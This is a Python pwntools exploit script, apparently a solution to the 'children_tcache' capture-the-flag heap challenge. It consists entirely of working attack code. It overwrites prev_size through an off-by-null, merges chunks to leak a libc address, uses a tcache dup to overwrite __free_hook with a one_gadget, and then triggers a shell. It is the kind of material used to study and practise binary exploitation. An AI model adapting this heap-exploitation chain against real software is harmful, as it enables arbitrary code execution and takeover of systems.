from pwn import *

context.log_level = 'debug'

p = process('./children_tcache')

def new(size,data):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Data:')
	p.sendline(data)

def show(index):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(index))

def delete(index):
	p.recvuntil('choice: ')
	p.sendline('3')
	p.recvuntil('Index:')
	p.sendline(str(index))


new(0x500,'a')
new(0x28,'a')
new(0x4f0,'a')
new(0x20,'a')

delete(0)

delete(1)
new(0x28,'a')

#overwrite the pre_chunk_in_use and pre_size
#clean pre_size
for i in range(6):
	delete(0)
	new(0x20+8-i,'a'*(0x20+8-i))

delete(0)
new(0x20+2,'a'*0x20 + '\x40\x05')

#unsorted bin Merging forward
delete(2)

new(0x500,'a')

#leak libc
show(0)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 96 - 0x3ebc40
log.success('libc_base addr : 0x%x'%libc_base)
free_hook = libc_base + 0x3ed8e8
one_gadget = libc_base + 0x4f322
log.success('free_hook addr : 0x%x'%free_hook)
log.success('one_gadget addr : 0x%x'%one_gadget)

#tcache dup
new(0x28,'a')
delete(0)
delete(2)

#hijack free_hook to one_gadget
new(0x28,p64(free_hook))
new(0x28,'a')
new(0x28,p64(one_gadget))

#trigger one_gadget
delete(1)

#gdb.attach(p)

p.interactive()








